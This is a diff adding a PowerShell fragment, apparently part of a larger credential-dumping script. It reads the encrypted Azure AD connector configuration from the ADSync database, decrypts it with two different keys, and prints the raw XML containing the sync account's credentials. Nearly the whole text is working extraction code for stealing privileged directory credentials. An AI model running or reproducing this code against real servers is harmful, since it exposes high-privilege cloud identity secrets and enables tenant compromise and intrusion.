@@ -1,0 +1,26 @@
+Write-Host "=== SYNC_xxx Account (Azure AD Connector - DEBUG) ==="
+
+$cmd = $client.CreateCommand()
+$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'Extensible2'"
+$reader = $cmd.ExecuteReader()
+
+if ($reader.Read()) {
+    $config_azure = $reader.GetString(0)
+    $crypted_azure = $reader.GetString(1)
+    $reader.Close()
+    
+    $decrypted_azure = $null
+    $key2.DecryptBase64ToString($crypted_azure, [ref]$decrypted_azure)
+    
+    # Dump the raw decrypted XML to see the structure
+    Write-Host "=== RAW DECRYPTED XML ===" 
+    Write-Host $decrypted_azure
+    
+    # Also try key1 in case key2 is wrong
+    Write-Host "`n=== Trying Key 1 ===" 
+    $key1 = $null
+    $km.GetKey(0, [ref]$key1)
+    $decrypted_azure_key1 = $null
+    $key1.DecryptBase64ToString($crypted_azure, [ref]$decrypted_azure_key1)
+    Write-Host $decrypted_azure_key1
+}
